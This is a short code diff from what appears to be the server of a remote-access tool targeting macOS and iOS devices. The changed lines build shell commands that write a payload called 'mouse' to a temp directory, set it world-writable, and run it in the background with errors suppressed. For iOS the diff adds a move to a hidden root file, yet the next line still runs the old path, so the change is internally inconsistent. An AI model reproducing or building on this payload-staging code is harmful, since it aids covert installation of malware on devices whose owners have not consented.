@@ -112,9 +112,9 @@ class Server:
             f.close()
             #save to tmp, 
             instructions = \
-            "cat >/tmp/mouse;"+\
-            "chmod 777 /tmp/mouse;"+\
-            "/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
+            "cat >/private/tmp/mouse;"+\
+            "chmod 777 /private/tmp/mouse;"+\
+            "/private/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         elif device_arch in self.ios_architectures:
             self.verbose_print("Detected iOS")
@@ -124,6 +124,7 @@ class Server:
             instructions = \
             "cat >/tmp/mouse;"+\
             "chmod 777 /tmp/mouse;"+\
+            "mv /tmp/mouse /.mouse;"+\
             "/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         else:
